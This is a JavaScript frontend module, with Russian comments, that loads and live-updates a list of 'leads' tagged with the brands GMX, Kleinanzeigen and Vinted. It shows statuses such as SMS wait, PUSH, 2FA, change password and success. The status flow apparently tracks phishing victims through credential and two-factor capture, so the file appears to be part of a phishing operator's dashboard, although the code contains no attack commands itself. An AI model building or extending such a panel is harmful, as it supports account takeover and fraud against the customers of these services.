// modules/backend.js — подключает прототип к реальному бэкенду.
// Шаг 1: загружает /api/leads и рендерит список лидов вместо фейк-карточек.
// Шаг 2: подписывается на /ws и обновляет список при изменениях.

const LIST_EL = document.querySelector('.lead-list');
const COUNT_EL = document.querySelector('.list-count');
const PAGINATOR_INFO = document.querySelectorAll('.paginator span');

if (LIST_EL) {
  bootstrap();
}

async function bootstrap() {
  try {
    const leads = await fetchLeads();
    renderLeads(leads);
  } catch (e) {
    console.error('[backend] fetch failed', e);
    if (window.toast) window.toast.error('Не удалось загрузить лидов', e.message || '');
    return;
  }
  // WebSocket — auto-reconnect на разрыв
  connectWS();
}

async function fetchLeads() {
  const r = await fetch('/api/leads', { credentials: 'include' });
  if (!r.ok) throw new Error('HTTP ' + r.status);
  const d = await r.json();
  return Array.isArray(d) ? d : (d.leads || []);
}

function brandClass(brand) {
  if (brand === 'gmx') return 'gx';
  if (brand === 'klein') return 'kl';
  if (brand === 'vint') return 'vt';
  return 'wd';
}

function statusBadge(lead) {
  const st = (lead.status || '').toLowerCase();
  // soft maps from server status → prototype badge
  if (st.includes('success') || st === 'show_success') return { cls: 'success', label: 'Успех' };
  if (st.includes('wrong') || st === 'error') return { cls: 'danger', label: 'Ошибка' };
  if (st.includes('sms')) return { cls: 'warning', label: 'SMS wait' };
  if (st.includes('push')) return { cls: 'info', label: 'PUSH' };
  if (st.includes('2fa') || st.includes('two_factor')) return { cls: 'warning', label: '2FA' };
  if (st.includes('change_password')) return { cls: 'warning', label: 'Password' };
  if (st.includes('download')) return { cls: 'info', label: 'Download' };
  if (st.includes('email') || st === 'pending') return { cls: '', label: 'Новый' };
  return { cls: '', label: st || '—' };
}

function isOnline(lead) {
  if (!lead.lastSeenAt) return false;
  const dt = new Date(lead.lastSeenAt).getTime();
  return Date.now() - dt < 60_000; // считаем онлайн если активность за минуту
}

function leadRowHtml(lead, idx) {
  const email = lead.email || lead.emailKl || lead.emailVt || '—';
  const badge = statusBadge(lead);
  const online = isOnline(lead);
  return `
    <div class="lead-row" data-lead-id="${escapeAttr(lead.id || '')}">
      <span class="lead-num">${idx + 1}</span>
      <span class="lead-status-dot ${online ? '' : 'offline'}"></span>
      <div class="lead-info">
        <div class="lead-email">${escapeHtml(email)}</div>
        <div class="lead-meta">
          <span class="badge ${badge.cls}">${escapeHtml(badge.label)}</span>
        </div>
      </div>
    </div>
  `;
}

function renderLeads(leads) {
  if (!LIST_EL) return;
  LIST_EL.innerHTML = leads.map(leadRowHtml).join('') || '<div class="list-empty" style="padding:24px;color:var(--text-3);text-align:center">Лидов нет</div>';
  // первый — активный по умолчанию
  const first = LIST_EL.querySelector('.lead-row');
  if (first) first.classList.add('active');
  if (COUNT_EL) COUNT_EL.textContent = leads.length ? `1-${leads.length}/${leads.length}` : '0/0';
  PAGINATOR_INFO.forEach((s) => { if (/\d+\/\d+/.test(s.textContent)) s.textContent = '1/1'; });
}

// ── WebSocket ─────────────────────────────────────────────────────────
function connectWS() {
  let url;
  try {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    url = `${proto}//${location.host}/ws`;
  } catch (_) { return; }
  let ws;
  let backoff = 1000;
  function open() {
    try { ws = new WebSocket(url); } catch (e) { setTimeout(open, backoff); return; }
    ws.onopen = () => { backoff = 1000; };
    ws.onmessage = onWSMessage;
    ws.onclose = () => { setTimeout(open, Math.min(backoff *= 2, 15000)); };
    ws.onerror = () => { try { ws.close(); } catch (_) {} };
  }
  open();
}
async function onWSMessage(ev) {
  let msg;
  try { msg = JSON.parse(ev.data); } catch (_) { return; }
  // На любое событие, релевантное лидам — перечитываем список.
  if (msg && (msg.type === 'lead' || msg.kind === 'lead' || msg.event === 'lead-updated' || msg.event === 'lead-added')) {
    try {
      const leads = await fetchLeads();
      renderLeads(leads);
    } catch (_) {}
  }
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function escapeAttr(s) { return escapeHtml(s); }
